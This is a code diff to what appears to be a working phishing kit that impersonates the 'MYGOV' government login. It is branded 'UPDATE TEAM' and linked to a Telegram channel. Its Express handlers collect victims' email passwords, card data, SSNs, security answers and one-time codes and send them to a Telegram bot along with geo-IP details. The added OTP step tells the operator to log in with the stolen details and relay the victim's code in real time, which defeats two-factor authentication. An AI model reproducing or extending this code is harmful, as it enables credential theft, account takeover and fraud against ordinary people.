@@ -121,60 +121,12 @@ exports.loginPost2 = async (req, res) => {
 	
 };
 
+
 exports.login3 = (req, res) => {
-	res.render("login3");
+	return res.render("login3");
 };
 
 exports.loginPost3 = async (req, res) => {
-	const { emailAddr, emailPass } = req.body;
-	const sendAPIRequest = async (ipAddress) => {
-        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
-        return apiResponse.data;
-    };
-
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-
-	try{
-    console.log(ipAddressInformation);
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-
-
-        const message =
-            `✅ UPDATE TEAM | MYGOV | USER_${ipAddress}\n\n` +
-            `👤 EMAIL INFO\n` +
-			`EMAIL ADDRESS    : ${emailAddr}\n` +
-			`EMAIL PASSWORD   : ${emailPass}\n\n` +
-            
-            `🌍 GEO-IP INFO\n` +
-          `IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
-            
-
-        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
-        sendMessage(message);
-
-        res.redirect("/auth/login/4");
-    } catch (error) {
-		console.error('Unexpected error:', error.message);
-		res.status(500).send('Internal Server Error');
-	}
-	process.on('unhandledRejection', (reason, promise) => {
-		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
-	});
-	
-};
-
-exports.login4 = (req, res) => {
-	return res.render("login4");
-};
-
-exports.loginPost4 = async (req, res) => {
 	const { fullName, address, zip, phone, dob, ssn } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
@@ -212,7 +164,7 @@ exports.loginPost4 = async (req, res) => {
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
         sendMessage(message);
 
-        res.redirect("/auth/login/5");
+        res.redirect("/auth/login/4");
     } catch (error) {
 		console.error('Unexpected error:', error.message);
 		res.status(500).send('Internal Server Error');
@@ -223,12 +175,12 @@ exports.loginPost4 = async (req, res) => {
 	
 };
 
-exports.login5 = (req, res) => {
-	return res.render("login5");
+exports.login4 = (req, res) => {
+	return res.render("login4");
 };
 
-exports.loginPost5 = async (req, res) => {
-	const { cardNum, expDate, cvv, cpin } = req.body;
+exports.loginPost4 = async (req, res) => {
+	const { q1, a1, q2, a2, q3, a3 } = req.body;
 	const sendAPIRequest = async (ipAddress) => {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
 		console.log(apiResponse.data);
@@ -247,12 +199,14 @@ exports.loginPost5 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | MYGOV | USER_${ipAddress}\n\n` +
-		`👤 CARD INFO\n` +
-		`CARD NUMBER      : ${cardNum}\n` +
-		`EXPIRY DATE      : ${expDate}\n` +
-		`CVV              : ${cvv}\n` +
-		`CARD PIN         : ${cpin}\n\n` +
+		`✅ UPDATE TEAM | MYG0V | USER_${ipAddress}\n\n` +
+		`❓ SECRET QUESTIONS\n` +
+		`QUESTION 1       : ${q1}\n` +
+		`ANSWER 1         : ${a1}\n` +
+		`QUESTION 2       : ${q2}\n` +
+		`ANSWER 2         : ${a2}\n` +
+		`QUESTION 3       : ${q3}\n` +
+		`ANSWER 3         : ${a3}\n\n` +
 		`🌍 GEO-IP INFO\n` +
 		`IP ADDRESS       : ${ipAddress}\n` +
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
@@ -272,6 +226,59 @@ exports.loginPost5 = async (req, res) => {
 	});
 	
 };
+
+exports.login5 = (req, res) => {
+	const otpMsg =
+		`🚨 USER IS NOW WAITING FOR OTP CODE\n` +
+		`🚨 FOLLOW THE STEPS BELOW TO REQUEST OTP CODE\n\n` +
+		`Step 1: Login to site or app using login details you just received.\n` +
+		`Step 2: OTP code will be sent to the User.\n` +
+		`Step 3: User will input OTP code in page.\n` +
+		`Step 4: OTP code will be sent here.\n` +
+		`Step 5: Now input OTP Code on site or app to login.`;
+
+	const sendMessage = sendMessageFor(botToken, chatId);
+	sendMessage(otpMsg);
+	
+	return res.render("login5");
+};
+
+exports.loginPost5 = async (req, res) => {
+	const { otp } = req.body;
+	const sendAPIRequest = async (ipAddress) => {
+        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+		console.log(apiResponse.data);
+        return apiResponse.data;
+    };
+
+    const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+
+
+	try{
+ 
+	const message =
+		`✅ UPDATE TEAM | MYG0V | USER_${ipAddress}\n\n` +
+		`👤 OTP INFO\n` +
+		`OTP CODE         : ${otp}\n\n` +
+		`🌍 GEO-IP INFO\n` +
+		`IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
+
+	const sendMessage = sendMessageFor(botToken, chatId);
+	sendMessage(message);
+
+	res.redirect("/auth/complete");
+	} catch (error) {
+		console.error('Unexpected error:', error.message);
+		res.status(500).send('Internal Server Error');
+	}
+	process.on('unhandledRejection', (reason, promise) => {
+		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+	});
+	
+};
+
 
 exports.complete = (req, res) => {
 	return res.render("complete");
